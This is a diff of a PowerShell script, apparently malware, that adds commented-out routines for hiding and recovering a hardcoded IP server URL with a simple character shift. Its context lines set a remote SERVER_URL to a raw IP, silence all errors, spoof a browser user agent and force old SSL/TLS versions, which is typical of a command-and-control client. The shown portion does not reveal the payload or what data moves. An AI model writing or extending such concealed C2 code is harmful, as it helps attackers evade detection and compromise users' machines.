@@ -1,6 +1,35 @@
+# Original URL
+# Shift amount
+# $shift = 3
+# $url = "http://112.23.45.16/"
+# $obfuscatedUrl = ""
+# foreach ($char in $url.ToCharArray()) {
+#     # Shift the character by the specified number, ensuring the value stays within valid char range
+#     $obfuscatedChar = [char](([int][char]$char + $shift) % 256) # Modulo 256 for all characters
+#     $obfuscatedUrl += $obfuscatedChar
+# }
+
+#--------------------------------------------------------------
+
+
+# $url = "obf"
+# Shift amount used during obfuscation
+# $shift = 3
+# $deobfuscatedUrl = ""
+# foreach ($char in $url.ToCharArray()) {
+#     # Reverse the shift by subtracting the specified number, ensuring the value stays within valid char range
+#     $deobfuscatedChar = [char](([int][char]$char - $shift + 256) % 256) # Modulo 256 for all characters
+#     $deobfuscatedUrl += $deobfuscatedChar
+# }
+
+
+
+
+
+
+
 
 $ErrorActionPreference= 'silentlycontinue'
-
 $SERVER_URL = "http://172.86.75.106/"
 $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
